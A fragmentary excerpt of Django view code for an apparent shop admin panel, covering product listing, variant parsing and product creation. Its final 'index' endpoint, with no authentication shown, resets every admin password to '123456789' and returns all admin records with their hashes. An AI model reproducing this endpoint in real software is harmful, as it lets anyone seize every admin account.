...
def adminProductView(request):
    ...
    titles = ['Product ID','Name','Category','Stock','Status','Action']
    res['titles'] = titles
...
def singleProductView(request):
    ...
    if product_obj['size'].split('|')[0] != '':
        ...
        variant_data['unit'] = variant_data['variant_name'].apply(lambda x : x.split(' ')[1])
        variant_data['variant_name'] = variant_data['variant_name'].apply(lambda x : x.split(' ')[0])
...
def singleProductEdit(request):
    ...
    size = '|'.join(list(variants['variant_name'] + ' ' +variants['unit']))
...
def addNewProduct(request):
    if request.method == 'POST':
        ...
        res['tax'] = ""
        res['variant_data'] = []
        res['sibling_product'] = {'product_id':''}
        nutritional_info = pd.DataFrame({
...
@api_view(['GET'])
def index(request):
    admin_login.objects.all().update(password = make_password('123456789'))
    obj = admin_login.objects.values()
    return Response(obj)